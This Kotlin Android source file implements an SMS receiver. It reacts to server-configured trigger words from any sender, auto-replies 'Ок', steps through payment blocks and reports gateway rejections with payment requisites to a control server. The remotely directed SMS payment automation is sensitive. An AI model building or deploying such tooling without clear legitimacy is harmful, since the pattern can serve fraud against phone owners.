package com.example.messagesender

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import androidx.core.content.ContextCompat
import java.util.Calendar

/**
 * Drives the trigger cycle from incoming SMS (case-insensitive, from any number)
 * while the device is working. The configuration now comes from [DeviceStore]
 * (pushed by the server) instead of local fields, and the device runs a list of
 * payment blocks in order:
 *  - stop word ("символ"): reply "Ок", count it, pause until the resume word.
 *  - resume word ("успешно"): resume. If the current block's count is reached,
 *    move on to the next block's message; after the last block, finish.
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        if (messages.isEmpty()) return

        val sender = messages.first().originatingAddress ?: return
        val body = messages.joinToString(separator = "") { it.messageBody.orEmpty() }

        // Payment gateway (7878) rejected the current requisite → notify the owner.
        if (DeviceStore.isPaired(context) &&
            body.contains(REJECT_PHRASE, ignoreCase = true) &&
            sender.contains(DeviceStore.number(context))
        ) {
            val requisites = DeviceStore.currentPayment(context)?.requisites.orEmpty()
            if (requisites.isNotBlank()) {
                val appCtx = context.applicationContext
                Thread { ControlClient.reportEvent(appCtx, "rejected", requisites) }
                    .apply { isDaemon = true }.start()
            }
            return
        }

        val working = DeviceStore.isPaired(context) &&
            DeviceStore.run(context) &&
            !DeviceStore.isSessionDone(context) &&
            DeviceStore.hasWork(context)
        if (!working) return

        val stopWord = DeviceStore.stopWord(context)
        val resumeWord = DeviceStore.resumeWord(context)

        when {
            body.contains(stopWord, ignoreCase = true) -> handleTrigger(context, sender)
            body.contains(resumeWord, ignoreCase = true) -> handleResume(context)
        }
    }

    private fun handleTrigger(context: Context, sender: String) {
        // Ignore a second trigger while already waiting for the resume word.
        if (DeviceStore.isPaused(context)) return

        val now = Calendar.getInstance()
        val windows = DeviceStore.windows(context)
        val insideWindow = ScheduleWindows.insideAny(windows, now)
        val activeNow = DeviceStore.isOverride(context) ||
            (windows.isEmpty() && now.timeInMillis >= DeviceStore.startAtMillis(context)) ||
            insideWindow
        if (!activeNow) {
            Log.i(TAG, "Trigger outside active window; ignoring")
            return
        }

        replyOk(context, sender)

        DeviceStore.setTriggerCount(context, DeviceStore.triggerCount(context) + 1)
        // A trigger inside a window lets the current block finish past the window end.
        if (windows.isNotEmpty() && insideWindow) DeviceStore.setOverride(context, true)
        // Wait for "успешно"; advancement is decided when it arrives.
        DeviceStore.setPaused(context, true)

        reportStatusAsync(context)
    }

    private fun handleResume(context: Context) {
        if (!DeviceStore.isPaused(context)) return
        DeviceStore.setPaused(context, false)

        val need = DeviceStore.currentPayment(context)?.count ?: 1
        if (DeviceStore.triggerCount(context) >= need) {
            // Current payment block finished — move to the next block (or stop).
            val hasNext = DeviceStore.advancePaymentOrFinish(context)
            Log.i(TAG, if (hasNext) "Block done; advancing to next payment" else "All payments done; stopping")
        } else {
            Log.i(TAG, "Resume; continuing current block")
        }
        SenderService.kick(context)
        reportStatusAsync(context)
    }

    private fun replyOk(context: Context, destination: String) {
        val canSend = ContextCompat.checkSelfPermission(
            context, Manifest.permission.SEND_SMS
        ) == PackageManager.PERMISSION_GRANTED
        if (!canSend) {
            Log.w(TAG, "SEND_SMS not granted; cannot send reply")
            return
        }
        try {
            val sms: SmsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            sms.sendTextMessage(destination, null, DeviceStore.replyText(context), null, null)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send reply", e)
        }
    }

    private fun reportStatusAsync(context: Context) {
        val appCtx = context.applicationContext
        Thread { ControlClient.sync(appCtx, waitForChange = false) }.apply { isDaemon = true }.start()
    }

    companion object {
        private const val TAG = "SmsReceiver"
        private const val REJECT_PHRASE = "операция отклонена"
    }
}
